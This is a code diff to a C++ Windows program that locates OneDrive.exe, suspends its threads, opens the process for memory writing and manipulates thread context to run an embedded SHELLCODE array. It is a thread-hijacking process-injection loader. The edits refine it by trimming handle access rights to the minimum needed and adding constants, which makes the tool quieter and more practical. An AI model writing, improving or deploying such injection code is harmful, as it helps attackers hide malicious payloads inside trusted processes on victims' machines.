@@ -10,6 +10,7 @@
 
 #define NO_PROCID 0
 #define NO_INHERIT FALSE
+#define THREAD_RWS_ACCESS (THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME)
 #define RANDOM_ADDR NULL
 #define NUM_OF_BYTES NULL
 
@@ -61,12 +62,13 @@ const unsigned char SHELLCODE[] = {
 };
 
 using AutoHandle = std::unique_ptr<std::remove_pointer<HANDLE>::type, decltype(&CloseHandle)>;
-std::wstring ONEDRIVE = L"OneDrive.exe";
+const std::wstring ONEDRIVE = L"OneDrive.exe";
+constexpr DWORD INVALID_HANDLE = (DWORD)-1;
 
 // Returning ProcessEntry32 Structure of OneDrive.exe
 PROCESSENTRY32 getPE() {
     AutoHandle hProcesses(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NO_PROCID), CloseHandle);
-    if (hProcesses.get() == INVALID_HANDLE_VALUE) {
+    if (INVALID_HANDLE_VALUE == hProcesses.get()) {
         std::cerr << "Failed to take processes snapshot " << GetLastError() << std::endl;
         return {};
     }
@@ -94,7 +96,7 @@ int main() {
     PROCESSENTRY32 pe32;
     pe32 = getPE();
 
-    if (0 == pe32.th32ProcessID) {
+    if (0 == pe32.dwSize) {
         std::cerr << "Target process not found " << std::endl;
         return 1;
     }
@@ -112,7 +114,7 @@ int main() {
         std::cerr << "Failed to get the first thread " << GetLastError() << std::endl;
         return 1;
     }
-  
+
     // Looping all the threads in the system
     do
     {
@@ -120,19 +122,19 @@ int main() {
         if (!(th32.th32OwnerProcessID == pe32.th32ProcessID)) {
             continue;
         }
-
-        AutoHandle hThread(OpenThread(THREAD_ALL_ACCESS, NO_INHERIT, th32.th32ThreadID), CloseHandle);
+        
+        AutoHandle hThread(OpenThread(THREAD_RWS_ACCESS, NO_INHERIT, th32.th32ThreadID), CloseHandle);
         if (NULL == hThread) {
             std::cerr << "Failed to open the thread" << GetLastError() << std::endl;
             return 1;
         }
 
-        if (((DWORD) -1) == SuspendThread(hThread.get())) {
+        if (INVALID_HANDLE == SuspendThread(hThread.get())) {
             std::cerr << "Failed to suspend the thread " << GetLastError() << std::endl;
             return 1;
         }
-        
-        AutoHandle hProc(OpenProcess(PROCESS_ALL_ACCESS, NO_INHERIT, pe32.th32ProcessID), CloseHandle);
+
+        AutoHandle hProc(OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, NO_INHERIT, pe32.th32ProcessID), CloseHandle);
         if (NULL == hProc.get()) {
             std::cerr << "Failed to open handle to the process " << GetLastError() << std::endl;
             return 1;
@@ -149,7 +151,6 @@ int main() {
             return 1;
         }
 
-
         CONTEXT ctx = {};
         ctx.ContextFlags = CONTEXT_FULL;
 
@@ -165,7 +166,7 @@ int main() {
             return 1;
         }
 
-        if (((DWORD)-1) == ResumeThread(hThread.get())) {
+        if (INVALID_HANDLE == ResumeThread(hThread.get())) {
             std::cerr << "Failed to resume the thread " << GetLastError() << std::endl;
             return 1;
         }
